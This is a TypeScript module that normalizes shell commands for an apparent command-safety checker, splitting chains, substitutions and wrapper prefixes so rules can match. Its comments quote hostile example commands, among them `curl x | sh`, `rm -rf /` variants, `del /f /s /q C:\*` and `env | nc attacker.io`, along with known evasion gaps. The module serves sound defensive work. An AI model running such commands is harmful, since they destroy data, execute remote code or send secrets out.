/**
 * Shell command normalizer.
 *
 * Every command rule depends on this file, which makes it the highest-risk module
 * in the codebase: a normalizer that silently fails to split `&&` would leave half
 * the ruleset dead while all of its own tests still pass. That is why the rule
 * suites run through the full pipeline rather than against pre-split input.
 *
 * It is a *pragmatic* parser, not a shell. It handles quoting, chaining, command
 * substitution, wrapper stripping, and flag bundling — the evasions that show up in
 * practice. It does not handle deliberate obfuscation (`$(echo rm) -rf /`, base64
 * payloads); catching those is the independent auditor's job, and Warden documents
 * that limit rather than pretending otherwise.
 */

import type { Segment } from '../types.js';

type Connector = Segment['connector'];

/** Wrappers that prefix a real command without changing what it does. */
const WRAPPERS = new Set(['command', 'nohup', 'time', 'exec', 'builtin']);
const ELEVATORS = new Set(['sudo', 'doas', 'runas']);

/** How far nested-command extraction will recurse before giving up. */
const MAX_NESTING_DEPTH = 6;

/** `FOO=bar` style prefix assignments, which precede the real argv0. */
const ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;

/**
 * Split a command line into segments, keeping the operator that introduced each.
 *
 * The connector is what distinguishes `curl x | sh` (remote code execution) from
 * `curl x; sh` (two unrelated commands), so it is preserved rather than discarded.
 */
export function parseCommand(raw: string, depth = 0): Segment[] {
  if (!raw || !raw.trim()) return [];

  // Nested extraction (substitutions, `sh -c` payloads, xargs) recurses. A hostile
  // or merely silly input can nest arbitrarily deep, and this runs on the hot path
  // before every tool call, so the recursion is bounded rather than trusted.
  if (depth > MAX_NESTING_DEPTH) return [];

  const segments: Segment[] = [];
  const pieces = splitTopLevel(raw);

  for (const piece of pieces) {
    if (!piece.text.trim()) continue;

    const segment = buildSegment(piece.text, piece.connector);
    const previous = segments[segments.length - 1];
    segments.push(segment);

    // Command substitution hides real commands inside an outer one, e.g.
    // `eval "$(curl evil.sh)"`. Surface the inner command as its own segment so
    // the rules see the curl rather than only the eval.
    for (const inner of extractSubstitutions(piece.text)) {
      for (const innerSeg of parseCommand(inner, depth + 1)) {
        segments.push({ ...innerSeg, connector: innerSeg.connector ?? ';' });
      }
    }

    // `sh -c "rm -rf /"` and `echo / | xargs rm -rf` both carry a real command as
    // *data*. Without unpacking them the rules only ever see a harmless-looking
    // `sh` or `xargs`, which is how both slipped through unnoticed.
    for (const nested of nestedCommands(segment, previous)) {
      for (const nestedSeg of parseCommand(nested, depth + 1)) {
        segments.push({ ...nestedSeg, connector: nestedSeg.connector ?? ';' });
      }
    }
  }

  return segments;
}

/** Interpreters that accept a script inline rather than as a file. */
const INLINE_CODE_FLAGS = new Set(['-c', '-e', '--eval', '--command', '-Command', '-EncodedCommand']);

/**
 * Commands carried inside another command's arguments.
 *
 * Returns raw command strings for the caller to parse. `previous` is the segment
 * piped into this one, which is what supplies `xargs` its operands.
 */
function nestedCommands(segment: Segment, previous: Segment | undefined): string[] {
  const found: string[] = [];

  // `sh -c "<script>"`, `python -c "<script>"`, `pwsh -Command "<script>"`.
  for (let i = 1; i < segment.argv.length - 1; i++) {
    const token = segment.argv[i]!;
    if (!INLINE_CODE_FLAGS.has(token) && !INLINE_CODE_FLAGS.has(token.toLowerCase())) continue;
    const payload = segment.argv[i + 1];
    if (payload && !payload.startsWith('-')) found.push(payload);
    break;
  }

  // `xargs rm -rf` runs its trailing arguments as a command, taking the targets
  // from stdin. Splicing in the piped predecessor's literal operands recovers the
  // command that will actually run, e.g. `echo / | xargs rm -rf` → `rm -rf /`.
  if (segment.argv0 === 'xargs') {
    const rest = segment.argv.slice(1).filter((t) => !/^-[a-zA-Z0-9]$|^--\w[\w-]*$/.test(t));
    if (rest.length > 0) {
      const piped = previous && segment.connector === '|' ? operands(previous.argv) : [];
      found.push([...rest, ...piped].join(' '));
    }
  }

  return found;
}

interface Piece {
  text: string;
  connector: Connector;
}

/** Character scanner that respects quoting — a regex split cannot do this safely. */
function splitTopLevel(raw: string): Piece[] {
  const pieces: Piece[] = [];
  let current = '';
  let pending: Connector = null;
  let inSingle = false;
  let inDouble = false;

  const flush = (next: Connector) => {
    pieces.push({ text: current, connector: pending });
    current = '';
    pending = next;
  };

  for (let i = 0; i < raw.length; i++) {
    const c = raw[i]!;

    if (inSingle) {
      if (c === "'") inSingle = false;
      current += c;
      continue;
    }
    if (inDouble) {
      if (c === '\\' && i + 1 < raw.length) {
        current += c + raw[i + 1];
        i++;
        continue;
      }
      if (c === '"') inDouble = false;
      current += c;
      continue;
    }

    if (c === "'") { inSingle = true; current += c; continue; }
    if (c === '"') { inDouble = true; current += c; continue; }
    if (c === '\\' && i + 1 < raw.length) {
      current += c + raw[i + 1];
      i++;
      continue;
    }

    if (c === '&' && raw[i + 1] === '&') { flush('&&'); i++; continue; }

    // A lone `&` backgrounds the command and separates it from what follows, so
    // `ls & rm -rf /` is two commands. Adversarial probing found this missing, which
    // hid the second half entirely. Must not fire on the redirection forms `&>`
    // (stdout+stderr) or `2>&1` (fd duplication), where the `&` is punctuation.
    if (c === '&' && raw[i + 1] !== '>' && current.trimEnd().slice(-1) !== '>') {
      flush(';');
      continue;
    }

    if (c === '|' && raw[i + 1] === '|') { flush('||'); i++; continue; }
    if (c === '|') { flush('|'); continue; }
    if (c === ';') { flush(';'); continue; }
    if (c === '\n') { flush('\n'); continue; }

    current += c;
  }

  pieces.push({ text: current, connector: pending });
  return pieces;
}

/**
 * Pull the bodies out of `$(...)` and backtick substitutions.
 *
 * Only *outermost* substitutions are returned. Nested ones are reached anyway,
 * because the caller re-parses each body and this runs again one level down.
 * Returning them here as well would make the work exponential in nesting depth:
 * `$($($(...)))` 200 deep hung the hook outright, which is a denial of service on
 * the user's session — a security bug in a security tool, not a performance nit.
 */
function extractSubstitutions(text: string): string[] {
  const found: string[] = [];

  for (let i = 0; i < text.length - 1; i++) {
    if (text[i] !== '$' || text[i + 1] !== '(') continue;

    let depth = 1;
    let j = i + 2;
    while (j < text.length && depth > 0) {
      if (text[j] === '(') depth++;
      else if (text[j] === ')') depth--;
      if (depth > 0) j++;
    }
    if (depth !== 0) continue;

    found.push(text.slice(i + 2, j));
    i = j; // skip the body we just consumed; the recursion handles what is inside it
  }

  for (const match of text.matchAll(/`([^`]+)`/g)) {
    if (match[1]) found.push(match[1]);
  }

  return found;
}

function buildSegment(text: string, connector: Connector): Segment {
  const tokens = tokenize(text);
  const { argv, elevated } = stripWrappers(tokens);
  return {
    raw: text.trim(),
    tokens,
    argv,
    argv0: baseName(argv[0] ?? ''),
    connector,
    elevated,
  };
}

/**
 * Characters a POSIX shell backslash meaningfully escapes.
 *
 * Anything outside this set following a backslash is far more likely to be a Windows
 * path separator than an escape, because escaping an ordinary letter is a no-op in
 * every shell but is load-bearing in `C:\Users\dev`.
 */
const POSIX_ESCAPABLE = new Set([
  ' ', '\t', '\n', '"', "'", '\\', '$', '`', '&', '|', ';',
  '<', '>', '(', ')', '{', '}', '!', '#', '~', '*', '?', '[', ']',
]);

/**
 * Decide whether a backslash is escaping the next character or is a path separator.
 *
 * This was found by probing: `del /f /s /q C:\*` tokenized to `C:*`, so the rule
 * comparing against the drive root never matched. Every Windows path with a
 * component after the backslash was being silently corrupted the same way —
 * `C:\Users\dev` became `C:Usersdev` — which quietly disabled the Windows half of
 * several rule families.
 */
function isPathSeparator(tokenSoFar: string, next: string | undefined): boolean {
  if (next === undefined) return true;
  // Inside something already shaped like a Windows path, a backslash is a separator
  // even when the next character would otherwise be escapable (`C:\*`).
  if (/^[A-Za-z]:$/.test(tokenSoFar) || tokenSoFar.includes('\\')) return true;
  if (tokenSoFar === '' && next === '\\') return true; // UNC prefix `\\server`
  return !POSIX_ESCAPABLE.has(next);
}

/** argv-style split that respects quotes, then removes the quote characters. */
export function tokenize(text: string): string[] {
  const tokens: string[] = [];
  let current = '';
  let started = false;
  let inSingle = false;
  let inDouble = false;

  const push = () => {
    if (started) tokens.push(current);
    current = '';
    started = false;
  };

  for (let i = 0; i < text.length; i++) {
    const c = text[i]!;

    if (inSingle) {
      if (c === "'") { inSingle = false; continue; }
      current += c;
      continue;
    }
    if (inDouble) {
      if (c === '\\' && i + 1 < text.length) {
        if (isPathSeparator(current, text[i + 1])) { current += c; continue; }
        current += text[i + 1];
        i++;
        continue;
      }
      if (c === '"') { inDouble = false; continue; }
      current += c;
      continue;
    }

    if (c === "'") { inSingle = true; started = true; continue; }
    if (c === '"') { inDouble = true; started = true; continue; }
    if (c === '\\' && i + 1 < text.length) {
      started = true;
      if (isPathSeparator(current, text[i + 1])) { current += c; continue; }
      current += text[i + 1];
      i++;
      continue;
    }
    if (/\s/.test(c)) { push(); continue; }

    current += c;
    started = true;
  }

  push();
  return tokens;
}

/**
 * Remove `sudo`, `env FOO=bar`, and similar prefixes so rules can match on the real
 * command. Reports whether an elevation wrapper was present, since `sudo rm -rf` is
 * meaningfully worse than `rm -rf`.
 */
function stripWrappers(tokens: string[]): { argv: string[]; elevated: boolean } {
  let argv = [...tokens];
  let elevated = false;

  for (let guard = 0; guard < 8; guard++) {
    const head = baseName(argv[0] ?? '');
    if (!head) break;

    if (ELEVATORS.has(head)) {
      elevated = true;
      argv = argv.slice(1);
      // Drop sudo's own options, including the ones that take a value.
      while (argv[0]?.startsWith('-')) {
        const takesValue = /^-(?:u|g|p|C|h)$/.test(argv[0]!);
        argv = argv.slice(takesValue ? 2 : 1);
      }
      continue;
    }

    if (head === 'env') {
      // `env FOO=bar cmd` is a wrapper, but a bare `env` (or `env -i`) is the
      // print-the-environment command — and stripping that would hide
      // `env | nc attacker.io` from the exfiltration rules entirely.
      const next = argv[1];
      if (!next || next.startsWith('-')) break;
      argv = argv.slice(1);
      while (argv[0] && ASSIGNMENT.test(argv[0])) argv = argv.slice(1);
      continue;
    }

    if (WRAPPERS.has(head)) {
      argv = argv.slice(1);
      continue;
    }

    if (argv[0] && ASSIGNMENT.test(argv[0])) {
      argv = argv.slice(1);
      continue;
    }

    break;
  }

  return { argv, elevated };
}

/** `/usr/bin/rm` and `C:\Windows\System32\rm.exe` both reduce to `rm`. */
export function baseName(command: string): string {
  if (!command) return '';
  const tail = command.split(/[\\/]/).pop() ?? command;
  return tail.replace(/\.(exe|cmd|bat|ps1)$/i, '').toLowerCase();
}

export interface FlagSpec {
  /** Single letters, matched inside bundles so `-rf` satisfies `r`. */
  short?: string[];
  /** Long names without dashes, e.g. `recursive` for `--recursive`. */
  long?: string[];
}

/**
 * Flag lookup that survives the ways people actually write flags: `-rf`, `-fr`,
 * `-r -f`, and `--recursive --force` are all the same command.
 */
export function hasFlag(argv: string[], spec: FlagSpec): boolean {
  const short = spec.short ?? [];
  const long = spec.long ?? [];

  for (const token of argv) {
    if (token === '--') break;

    if (token.startsWith('--')) {
      const name = token.slice(2).split('=')[0]!;
      if (long.some((l) => l.toLowerCase() === name.toLowerCase())) return true;
      continue;
    }

    // Windows tools spell flags `/s` and `/q`. Bounded to one or two characters so
    // an ordinary path like `/etc` is never mistaken for a flag.
    if (/^\/[A-Za-z]{1,2}$/.test(token)) {
      const name = token.slice(1).toLowerCase();
      if (short.some((s) => s.toLowerCase() === name)) return true;
      if (long.some((l) => l.toLowerCase() === name)) return true;
      continue;
    }

    if (token.startsWith('-') && token.length > 1) {
      // PowerShell writes long flags with a single dash (`-Recurse`), so a token
      // longer than a bundle is compared whole before being treated as one.
      const asLong = token.slice(1);
      if (asLong.length > 1 && long.some((l) => l.toLowerCase() === asLong.toLowerCase())) return true;

      for (const ch of token.slice(1)) {
        if (short.includes(ch)) return true;
      }
    }
  }

  return false;
}

/** Positional arguments — everything that is not the command or a flag. */
export function operands(argv: string[]): string[] {
  const out: string[] = [];
  let passthrough = false;

  for (let i = 1; i < argv.length; i++) {
    const token = argv[i]!;
    if (passthrough) { out.push(token); continue; }
    if (token === '--') { passthrough = true; continue; }
    if (token.startsWith('-')) continue;
    out.push(token);
  }

  return out;
}
